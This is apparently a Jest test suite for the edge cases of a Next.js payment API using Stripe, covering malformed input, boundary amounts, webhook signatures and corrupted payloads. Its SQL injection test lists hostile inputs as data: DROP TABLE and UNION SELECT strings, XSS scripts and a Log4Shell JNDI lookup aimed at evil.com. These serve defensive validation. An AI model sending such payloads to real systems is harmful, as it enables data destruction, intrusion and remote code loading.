/**
 * Production-Grade Edge Cases Testing for Payment Systems
 * 
 * Tests for unusual scenarios, boundary conditions, malformed data,
 * and other edge cases that could occur in production environments.
 */

// Dynamic imports to avoid Request/Response loading issues in Jest
// All API functions will be imported dynamically in test functions
import { 
  TEST_AMOUNTS,
  createTestWebhookEvent,
  createTestWebhookRequest,
  generateTestWebhookSignature,
  cleanupTestPaymentIntents,
  ronToBani
} from '../utils/stripe-test-helpers';
import type { CartItem } from '@/types/cart';
import crypto from 'crypto';

beforeAll(() => {
  console.log('🔍 Starting Production-Grade Edge Cases Testing');
  console.log('🐛 These tests cover unusual scenarios and boundary conditions');
});

afterAll(async () => {
  // Dynamic import to avoid module-level loading issues
  const { cleanupTestPaymentIntents } = await import('../utils/stripe-test-helpers');
  await cleanupTestPaymentIntents('edge_case_test');
  console.log('✅ Edge cases testing cleanup completed');
});

describe('Production Edge Cases Testing', () => {

  // Reset rate limiting before each test section for proper isolation
  beforeEach(async () => {
    const { resetRateLimitStore } = await import('@/lib/security/rateLimit');
    resetRateLimitStore();
    // Small delay to ensure rate limit reset is processed
    await new Promise(resolve => setTimeout(resolve, 100));
  });

  describe('Malformed Request Handling', () => {
    it('should handle completely malformed JSON gracefully', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      
      const testId = `edge_malformed_json_${Date.now()}`;
      
      const malformedRequests = [
        '{"incomplete": json without closing brace',
        '{invalid json syntax}',
        '{"validJson": true, "but": "trailing comma",}',
        'not json at all',
        '{"unicode": "test with unicode \\uFFFF chars"}',
        '{"veryLongString": "' + 'A'.repeat(100000) + '"}', // 100KB string
        '', // Empty string
        '   ', // Only whitespace
        '{}', // Empty object
        '[]', // Array instead of object
        'null', // Null value
        'true', // Boolean value
        '123', // Number value
      ];

      for (const [index, malformedBody] of malformedRequests.entries()) {
        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_malformed_${index}`
          },
          body: malformedBody
        });

        const response = await createPaymentIntent(request);
        
        // Should handle malformed requests gracefully
        expect([400, 422, 500]).toContain(response.status);
        
        const responseData = await response.json();
        expect(responseData.success).toBe(false);
        expect(responseData.error).toBeDefined();
      }

      console.log(`✅ Malformed JSON handling test passed - tested ${malformedRequests.length} cases`);
    });

    it('should handle missing required fields', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge_missing_fields_${Date.now()}`;
      
      const incompleteRequests = [
        {}, // Completely empty
        { customerInfo: {} }, // Missing all customer info
        { customerInfo: { email: 'test@example.com' } }, // Missing other required fields
        { items: [] }, // Empty items array
        { items: null }, // Null items
        { items: [{}] }, // Items with missing properties
        { items: [{ id: 1, name: 'Test' }] }, // Missing price
        { items: [{ id: 1, price: 29.99 }] }, // Missing name
        { customerInfo: { email: 'invalid-email' } }, // Invalid email format
        { customerInfo: { phone: 'invalid-phone' } }, // Invalid phone format
      ];

      for (const [index, incompleteData] of incompleteRequests.entries()) {
        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_incomplete_${index}`
          },
          body: JSON.stringify(incompleteData)
        });

        const response = await createPaymentIntent(request);
        
        // Should reject incomplete requests
        expect([400, 422]).toContain(response.status);
        
        const responseData = await response.json();
        expect(responseData.success).toBe(false);
        expect(responseData.error.type).toBe('validation_error');
      }

      console.log(`✅ Missing required fields handling test passed - tested ${incompleteRequests.length} cases`);
    });

    it('should handle extremely large payloads', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge_large_payload_${Date.now()}`;
      
      // Create extremely large payload (but still valid JSON)
      const largeItems: CartItem[] = Array(1000).fill(0).map((_, i) => ({
        id: i,
        name: `Large Test Product ${i} with very long description that continues for a while and includes many details about the product that might be unnecessary but tests our system's ability to handle large amounts of text data in product names`,
        price: TEST_AMOUNTS.MIN_VALID + (i * 0.01),
        quantity: Math.floor(i % 5) + 1,
        image: `/test-product-${i}.jpg`,
        description: `This is a very long product description for item ${i} that contains a lot of text to test how our system handles large amounts of data. `.repeat(10)
      }));

      const largePayload = testUtils.createTestPaymentData({
        items: largeItems,
        clientRequestId: testId,
        customerInfo: {
          email: `large.payload.test+${testId}@example.com`,
          firstName: 'Large',
          lastName: 'Payload',
          phone: '+40123456789'
        },
        shippingAddress: {
          fullName: 'Large Payload Test',
          streetAddress: `Very Long Street Address Line That Goes On For A While And Includes Apartment Number And Building Details And Other Information That Makes This Address Very Long Indeed Number ${testId}`,
          city: 'Bucharest',
          postalCode: '123456',
          country: 'RO',
          state: 'B'
        }
      });

      const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'X-Request-ID': testId
        },
        body: JSON.stringify(largePayload)
      });

      const response = await createPaymentIntent(request);
      
      // Should either handle large payload or gracefully reject it
      if (response.status === 200) {
        const responseData = await response.json();
        expect(responseData.success).toBe(true);
        expect(responseData.paymentIntent).toBeDefined();
        console.log(`✅ Large payload handled successfully`);
      } else {
        // Should gracefully reject with appropriate error
        expect([413, 400, 422]).toContain(response.status); // Payload too large or validation error
        console.log(`✅ Large payload rejected gracefully with status ${response.status}`);
      }
    }, 30000);
  });

  describe('Boundary Value Testing', () => {
    it('should handle payment amounts at exact boundaries', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge-boundary-amounts-${Date.now()}`;
      
      const boundaryTests = [
        // Use amounts that work cleanly with 19% tax to avoid rounding issues
        { amount: 2.52, description: 'above minimum (tax-friendly amount)', shouldSucceed: true }, // 2.52 * 1.19 = 3.00 exactly
        { amount: 2.50, description: 'exact minimum', shouldSucceed: true }, // 2.50 * 1.19 = 2.975, rounded to 2.98
        { amount: 2.49, description: 'below minimum by 1 cent', shouldSucceed: false },
        { amount: 2.48, description: 'below minimum by 2 cents', shouldSucceed: false },
        { amount: 2.51, description: 'above minimum by 1 cent', shouldSucceed: true },
        { amount: 0.01, description: 'smallest possible amount', shouldSucceed: false },
        { amount: 0.00, description: 'zero amount', shouldSucceed: false },
        { amount: -1.00, description: 'negative amount', shouldSucceed: false },
        // Updated maximum to account for Stripe limits and 19% tax  
        { amount: 840000.00, description: 'near maximum amount (before tax)', shouldSucceed: true },
        { amount: 850000.00, description: 'above maximum (before tax)', shouldSucceed: false },
        { amount: 1000000, description: 'well above maximum', shouldSucceed: false },
        { amount: Infinity, description: 'infinity', shouldSucceed: false },
        { amount: NaN, description: 'NaN', shouldSucceed: false },
        // Test invalid decimal precision (should fail due to currency rules)
        { amount: 2.501, description: 'invalid decimal precision (3 places)', shouldSucceed: false },
        { amount: 2.499, description: 'invalid decimal precision (3 places) below min', shouldSucceed: false },
      ];

      for (const test of boundaryTests) {
        const testItems: CartItem[] = [
          {
            id: 1,
            name: 'Boundary Test Product',
            price: test.amount,
            quantity: 1,
            image: '/test-product.jpg'
          }
        ];

        const testData = testUtils.createTestPaymentData({
          items: testItems,
          clientRequestId: `${testId}-${test.description.replace(/[^a-z0-9]/gi, '-')}-${Math.random().toString(36).slice(2)}`
        });

        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_${test.description}`
          },
          body: JSON.stringify(testData)
        });

        const response = await createPaymentIntent(request);
        const responseData = await response.json();

        if (test.shouldSucceed) {
          expect(response.status).toBe(200);
          expect(responseData.success).toBe(true);
          console.log(`✅ ${test.description}: Accepted as expected`);
        } else {
          expect([400, 422, 429, 500]).toContain(response.status); // Include 429 for rate limiting
          expect(responseData.success).toBe(false);
          console.log(`✅ ${test.description}: Rejected as expected`);
        }
      }

      console.log(`✅ Boundary value testing completed`);
    });

    it('should handle maximum field lengths', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge-max-lengths-${Date.now()}`;
      
      const maxLengthTests = [
        // Valid length tests (should succeed)
        {
          field: 'email',
          value: 'valid.email@example.com', // Normal email
          shouldSucceed: true
        },
        {
          field: 'name',
          value: 'John Doe', // Normal name
          shouldSucceed: true
        },
        {
          field: 'phone',
          value: '+40123456789', // Normal phone
          shouldSucceed: true
        },
        {
          field: 'address',
          value: 'Str. Test 123, Bucharest', // Normal address
          shouldSucceed: true
        },
        {
          field: 'product_name',
          value: 'Test Product', // Normal product name
          shouldSucceed: true
        },
        // Invalid length tests (should fail)
        {
          field: 'email',
          value: 'a'.repeat(100) + '@' + 'b'.repeat(100) + '.com', // Very long email
          shouldSucceed: false
        },
        {
          field: 'name',
          value: 'A'.repeat(1000), // Very long name
          shouldSucceed: false
        },
        {
          field: 'phone',
          value: '+40' + '1'.repeat(50), // Very long phone
          shouldSucceed: false
        },
        {
          field: 'address',
          value: 'Very Long Address '.repeat(100), // Very long address
          shouldSucceed: false
        },
        {
          field: 'product_name',
          value: 'Ultra Long Product Name '.repeat(100), // Very long product name
          shouldSucceed: false
        }
      ];

      for (const test of maxLengthTests) {
        let testData = testUtils.createTestPaymentData({
          items: [
            {
              id: 1,
              name: test.field === 'product_name' ? test.value : 'Test Product',
              price: TEST_AMOUNTS.STANDARD,
              quantity: 1,
              image: '/test-product.jpg'
            }
          ],
          clientRequestId: `${testId}_${test.field}`
        });

        // Apply the test value to the appropriate field
        if (test.field === 'email') {
          testData.customerInfo.email = test.value;
        } else if (test.field === 'name') {
          testData.customerInfo.firstName = test.value;
        } else if (test.field === 'phone') {
          testData.customerInfo.phone = test.value;
        } else if (test.field === 'address') {
          testData.shippingAddress.streetAddress = test.value;
        }

        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_${test.field}`
          },
          body: JSON.stringify(testData)
        });

        const response = await createPaymentIntent(request);
        
        if (test.shouldSucceed) {
          expect(response.status).toBe(200);
        } else {
          expect([400, 422, 500]).toContain(response.status);
        }

        console.log(`✅ ${test.field} max length test: ${test.shouldSucceed ? 'accepted' : 'rejected'} as expected`);
      }

      console.log(`✅ Maximum field length testing completed`);
    });
  });

  describe('Unicode and Special Character Handling', () => {
    it('should handle unicode characters in all fields', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge_unicode_${Date.now()}`;
      
      const unicodeTestData = testUtils.createTestPaymentData({
        items: [
          {
            id: 1,
            name: '🎵 Produs Test cu Emoji și Unicode: Ñoël 测试产品 العربية 🛒💳',
            price: TEST_AMOUNTS.STANDARD,
            quantity: 1,
            image: '/test-product-unicode.jpg'
          }
        ],
        clientRequestId: testId,
        customerInfo: {
          email: `unicode.test+${testId}@exämple.com`,
          firstName: 'Ñoël',
          lastName: 'Müller-Jørgensen',
          phone: '+40123456789'
        },
        shippingAddress: {
          fullName: 'Ñoël Müller-Jørgensen',
          streetAddress: 'Strada Ștefan cel Mare Nr. 123, Ap. 4Ã',
          city: 'Brașov',
          postalCode: '500123',
          country: 'RO',
          state: 'BV'
        }
      });

      const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'X-Request-ID': testId
        },
        body: JSON.stringify(unicodeTestData)
      });

      const response = await createPaymentIntent(request);
      const responseData = await response.json();

      expect(response.status).toBe(200);
      expect(responseData.success).toBe(true);
      
      // Verify unicode characters are properly handled by checking the stored order
      const { getOrderById: getOrderUnicode } = await import('@/lib/orderStore');
      const storedOrder = getOrderUnicode(responseData.order.id);
      expect(storedOrder?.customerInfo.firstName).toBe('Ñoël');

      console.log(`✅ Unicode character handling test passed`);
    });

    it('should handle SQL injection attempts in all fields', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      const { getOrderById: getOrderSQL } = await import('@/lib/orderStore');
      
      const testId = `edge_sql_injection_${Date.now()}`;
      
      const sqlInjectionAttempts = [
        "'; DROP TABLE orders; --",
        "' OR '1'='1",
        "1; DELETE FROM payments WHERE 1=1; --",
        "admin'/*",
        "' UNION SELECT * FROM users --",
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "${jndi:ldap://evil.com}",
      ];

      for (const [index, injection] of sqlInjectionAttempts.entries()) {
        const testData = testUtils.createTestPaymentData({
          items: [
            {
              id: 1,
              name: `SQL Injection Test ${injection}`,
              price: TEST_AMOUNTS.STANDARD,
              quantity: 1,
              image: '/test-product.jpg'
            }
          ],
          clientRequestId: `${testId}_sql_${index}`,
          customerInfo: {
            email: `sql.injection.test+${index}@example.com`,
            firstName: injection,
            lastName: 'Test',
            phone: '+40123456789'
          }
        });

        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_sql_${index}`
          },
          body: JSON.stringify(testData)
        });

        const response = await createPaymentIntent(request);
        
        // Should either handle safely or reject
        if (response.status === 200) {
          const responseData = await response.json();
          expect(responseData.success).toBe(true);
          // Verify the injection was properly escaped/sanitized
          const order = getOrderSQL(responseData.order.id);
          expect(order?.customerInfo.firstName).not.toContain('DROP TABLE');
        } else {
          // Should reject with validation error or rate limiting
          expect([400, 422, 429]).toContain(response.status);
        }
      }

      console.log(`✅ SQL injection prevention test passed - tested ${sqlInjectionAttempts.length} cases`);
    });
  });

  describe('Webhook Edge Cases', () => {
    it('should handle malformed webhook signatures', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: stripeWebhook } = await import('@/app/api/webhooks/stripe/route');
      const { NextRequest } = await import('next/server');
      
      const testId = `edge_webhook_signatures_${Date.now()}`;
      
      const mockPI = {
        id: 'pi_test_malformed_signature',
        amount: ronToBani(TEST_AMOUNTS.STANDARD),
        currency: 'ron',
        status: 'succeeded',
        metadata: { orderId: 'test_order', testId }
      } as any;

      const webhookEvent = createTestWebhookEvent('payment_intent.succeeded', mockPI);
      const validPayload = JSON.stringify(webhookEvent);

      const malformedSignatures = [
        'malformed_signature',
        't=,v1=invalid',
        't=invalid_timestamp,v1=invalid_signature',
        't=' + Math.floor(Date.now() / 1000) + ',v1=', // Empty signature
        't=' + Math.floor(Date.now() / 1000) + ',v2=valid_but_wrong_version', // Wrong version
        '', // Empty signature
        '   ', // Whitespace only
        'totally_invalid_format',
        'v1=signature_without_timestamp',
        't=' + (Math.floor(Date.now() / 1000) + 1000) + ',v1=future_timestamp', // Future timestamp
      ];

      for (const [index, signature] of malformedSignatures.entries()) {
        const request = new NextRequest('http://localhost:3000/api/webhooks/stripe', {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'stripe-signature': signature,
            'user-agent': 'Stripe/1.0 (+https://stripe.com/docs/webhooks)',
          },
          body: validPayload,
        });

        const response = await stripeWebhook(request);
        
        // Should reject malformed signatures
        expect([400, 401, 403]).toContain(response.status);
        console.log(`✅ Malformed signature ${index} rejected with status ${response.status}`);
      }

      console.log(`✅ Malformed webhook signature handling test passed`);
    });

    it('should handle webhook events for non-existent orders', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: stripeWebhook } = await import('@/app/api/webhooks/stripe/route');
      
      const testId = `edge_nonexistent_orders_${Date.now()}`;
      
      const nonExistentOrderIds = [
        'ord_nonexistent_12345',
        '',
        null,
        undefined,
        'ord_with_special_chars_!@#$%',
        'ord_very_long_' + 'a'.repeat(1000),
      ];

      for (const [index, orderId] of nonExistentOrderIds.entries()) {
        const mockPI = {
          id: `pi_test_nonexistent_${index}`,
          amount: ronToBani(TEST_AMOUNTS.STANDARD),
          currency: 'ron',
          status: 'succeeded',
          metadata: { orderId, testId }
        } as any;

        const webhookEvent = createTestWebhookEvent('payment_intent.succeeded', mockPI);
        const webhookRequest = createTestWebhookRequest(
          webhookEvent,
          process.env.STRIPE_WEBHOOK_SECRET!
        );

        const response = await stripeWebhook(webhookRequest);
        
        // Should handle non-existent orders gracefully
        // Could either succeed (idempotent) or fail gracefully
        expect(response.status).toBeLessThan(500); // No server errors
        
        console.log(`✅ Non-existent order ${orderId} handled gracefully with status ${response.status}`);
      }

      console.log(`✅ Non-existent order webhook handling test passed`);
    });

    it('should handle duplicate webhook events', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { POST: stripeWebhook } = await import('@/app/api/webhooks/stripe/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      const { getOrderById: getOrderDupe } = await import('@/lib/orderStore');
      
      const testId = `edge_duplicate_webhooks_${Date.now()}`;
      
      // First, create a real order
      const testItems: CartItem[] = [
        {
          id: 1,
          name: 'Duplicate Webhook Test Product',
          price: TEST_AMOUNTS.STANDARD,
          quantity: 1,
          image: '/test-product.jpg'
        }
      ];

      const testData = testUtils.createTestPaymentData({
        items: testItems,
        clientRequestId: testId
      });

      const createRequest = new NextRequest('http://localhost:3000/api/payments/create-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'X-Request-ID': testId
        },
        body: JSON.stringify(testData)
      });

      const createResponse = await createPaymentIntent(createRequest);
      expect(createResponse.status).toBe(200);
      
      const createData = await createResponse.json();
      const { order } = createData;

      // Create webhook event with complete metadata (matching what payment intent creation adds)
      const mockPI = {
        id: `pi_test_duplicate_${testId}`,
        amount: order.totals?.total || order.total, // Use actual order total (post-tax)
        currency: 'ron',
        status: 'succeeded',
        metadata: {
          // Core webhook processing identifiers
          orderId: order.id,
          requestId: testId,
          orderNumber: order.orderNumber,
          
          // Customer information for webhook processing
          customerEmail: testData.customerInfo.email,
          customerName: `${testData.customerInfo.firstName} ${testData.customerInfo.lastName}`.trim() || 'Guest Customer',
          
          // Order details for webhook processing
          itemCount: testItems.length.toString(),
          orderTotal: order.total.toString(),
          currency: 'RON',
          
          // Session tracking
          clientRequestId: testId,
          sessionId: '',
          
          // Webhook processing flags and routing
          webhookVersion: '1.0',
          requiresFulfillment: 'true',
          orderSource: 'web',
          
          // Security context
          securityRiskLevel: 'low',
        }
      } as any;

      const webhookEvent = createTestWebhookEvent('payment_intent.succeeded', mockPI);

      // Send the same webhook multiple times (same event ID for proper duplicate detection)
      const responses: Response[] = [];
      for (let i = 0; i < 3; i++) {
        // Create fresh requests each time with identical webhook event
        const duplicateRequest = createTestWebhookRequest(
          webhookEvent,
          process.env.STRIPE_WEBHOOK_SECRET!
        );
        const response = await stripeWebhook(duplicateRequest);
        responses.push(response);
      }

      // All should succeed (idempotent behavior)
      for (const response of responses) {
        expect(response.status).toBe(200);
      }

      // Verify order is still in correct state
      const finalOrder = getOrderDupe(order.id);
      expect(finalOrder?.status).toBe('paid');

      console.log(`✅ Duplicate webhook handling test passed`);
    });
  });

  describe('Network and Timing Edge Cases', () => {
    it('should handle very slow requests (timeout simulation)', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge_timeout_${Date.now()}`;
      
      // Create a valid request that we'll use for timeout testing
      const testItems: CartItem[] = [
        {
          id: 1,
          name: 'Timeout Test Product',
          price: TEST_AMOUNTS.STANDARD,
          quantity: 1,
          image: '/test-product.jpg'
        }
      ];

      const testData = testUtils.createTestPaymentData({
        items: testItems,
        clientRequestId: testId
      });

      const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'X-Request-ID': testId,
          'X-Simulate-Slow-Request': 'true'
        },
        body: JSON.stringify(testData)
      });

      // Set a timeout for the request
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Request timeout')), 30000); // 30 second timeout
      });

      try {
        const response = await Promise.race([
          createPaymentIntent(request),
          timeoutPromise
        ]) as Response;
        
        // If we get here, the request completed within timeout
        expect(response.status).toBeLessThan(500);
        console.log(`✅ Slow request handled within timeout with status ${response.status}`);
      } catch (error) {
        // If we timeout, that's also acceptable behavior
        if ((error as Error).message === 'Request timeout') {
          console.log(`✅ Request properly timed out after 30 seconds`);
        } else {
          throw error;
        }
      }
    }, 35000);

    it('should handle rapid sequential requests from same user', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      
      const testId = `edge_rapid_sequential_${Date.now()}`;
      const customerEmail = `rapid.test+${testId}@example.com`;
      
      const testItems: CartItem[] = [
        {
          id: 1,
          name: 'Rapid Sequential Test Product',
          price: TEST_AMOUNTS.MIN_VALID,
          quantity: 1,
          image: '/test-product.jpg'
        }
      ];

      // Send 5 rapid sequential requests
      const responses: Response[] = [];
      for (let i = 0; i < 5; i++) {
        const testData = testUtils.createTestPaymentData({
          items: testItems,
          clientRequestId: `${testId}_rapid_${i}`,
          customerInfo: {
            email: customerEmail,
            firstName: 'Rapid',
            lastName: `Test${i}`,
            phone: '+40123456789'
          }
        });

        const request = new NextRequest('http://localhost:3000/api/payments/create-intent', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Origin': 'http://localhost:3000',
            'X-Request-ID': `${testId}_rapid_${i}`,
            'X-Forwarded-For': '192.168.1.200' // Same IP for all requests
          },
          body: JSON.stringify(testData)
        });

        const response = await createPaymentIntent(request);
        responses.push(response);
        
        // No delay between requests (rapid fire)
      }

      // Analyze results
      const statuses = responses.map(r => r.status);
      const successCount = statuses.filter(s => s === 200).length;
      const rateLimitedCount = statuses.filter(s => s === 429).length;
      const errorCount = statuses.filter(s => s >= 400 && s !== 429).length;

      console.log(`🔥 Rapid sequential requests results:`);
      console.log(`   Successful: ${successCount}`);
      console.log(`   Rate Limited: ${rateLimitedCount}`);
      console.log(`   Errors: ${errorCount}`);

      // Should handle rapid requests gracefully
      expect(errorCount).toBe(0); // No server errors
      expect(successCount + rateLimitedCount).toBe(responses.length);

      console.log(`✅ Rapid sequential requests test passed`);
    });
  });

  describe('Data Corruption and Recovery', () => {
    it('should handle corrupted webhook payloads', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: stripeWebhook } = await import('@/app/api/webhooks/stripe/route');
      const { NextRequest } = await import('next/server');
      
      const testId = `edge_corrupted_webhook_${Date.now()}`;
      
      const corruptedPayloads = [
        '{"id":"evt_test","type":"payment_intent.succeeded","data":null}', // Null data
        '{"id":"evt_test","type":"payment_intent.succeeded"}', // Missing data
        '{"id":"evt_test","data":{"object":{}}}', // Empty object
        '{"type":"unknown_event_type","data":{"object":{}}}', // Unknown event type
        '{"id":"evt_test","type":"payment_intent.succeeded","data":{"object":{"amount":"not_a_number"}}}', // Invalid amount
        '{"id":"evt_test","type":"payment_intent.succeeded","data":{"object":{"currency":"INVALID"}}}', // Invalid currency
      ];

      for (const [index, payload] of corruptedPayloads.entries()) {
        const signature = generateTestWebhookSignature(
          payload,
          process.env.STRIPE_WEBHOOK_SECRET!
        );

        const request = new NextRequest('http://localhost:3000/api/webhooks/stripe', {
          method: 'POST',
          headers: {
            'content-type': 'application/json',
            'stripe-signature': signature,
            'user-agent': 'Stripe/1.0 (+https://stripe.com/docs/webhooks)',
          },
          body: payload,
        });

        const response = await stripeWebhook(request);
        
        // Should handle corrupted payloads gracefully
        expect(response.status).toBeLessThan(500); // No server errors
        console.log(`✅ Corrupted payload ${index} handled with status ${response.status}`);
      }

      console.log(`✅ Corrupted webhook payload handling test passed`);
    });

    it('should maintain data consistency during partial failures', async () => {
      // Dynamic imports to avoid Request/Response loading issues in Jest
      const { POST: createPaymentIntent } = await import('@/app/api/payments/create-intent/route');
      const { POST: stripeWebhook } = await import('@/app/api/webhooks/stripe/route');
      const { NextRequest } = await import('next/server');
      const testUtils = await import('../utils/stripe-test-helpers');
      const { getOrderById: getOrderPartial } = await import('@/lib/orderStore');
      
      const testId = `edge_partial_failure_${Date.now()}`;
      
      // Create an order first
      const testItems: CartItem[] = [
        {
          id: 1,
          name: 'Partial Failure Test Product',
          price: TEST_AMOUNTS.STANDARD,
          quantity: 1,
          image: '/test-product.jpg'
        }
      ];

      const testData = testUtils.createTestPaymentData({
        items: testItems,
        clientRequestId: testId
      });

      const createRequest = new NextRequest('http://localhost:3000/api/payments/create-intent', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'http://localhost:3000',
          'X-Request-ID': testId
        },
        body: JSON.stringify(testData)
      });

      const createResponse = await createPaymentIntent(createRequest);
      expect(createResponse.status).toBe(200);
      
      const createData = await createResponse.json();
      const { order } = createData;

      // Verify initial order state
      const initialOrder = getOrderPartial(order.id);
      expect(initialOrder?.status).toBe('pending');

      // Try to process a webhook with corrupted data but valid signature
      const partiallyCorruptedPI = {
        id: `pi_test_partial_${testId}`,
        amount: 'corrupted_amount', // Invalid amount type
        currency: 'ron',
        status: 'succeeded',
        metadata: { orderId: order.id, testId }
      } as any;

      const webhookEvent = createTestWebhookEvent('payment_intent.succeeded', partiallyCorruptedPI);
      const webhookRequest = createTestWebhookRequest(
        webhookEvent,
        process.env.STRIPE_WEBHOOK_SECRET!
      );

      const webhookResponse = await stripeWebhook(webhookRequest);
      
      // Webhook should handle gracefully
      expect(webhookResponse.status).toBeLessThan(500);

      // Verify order state remained consistent (not corrupted)
      const finalOrder = getOrderPartial(order.id);
      expect(finalOrder?.status).toBe('pending'); // Should remain unchanged due to error
      expect(finalOrder?.id).toBe(order.id);
      expect(finalOrder?.total).toBe(initialOrder?.total);

      console.log(`✅ Partial failure data consistency test passed`);
    });
  });
});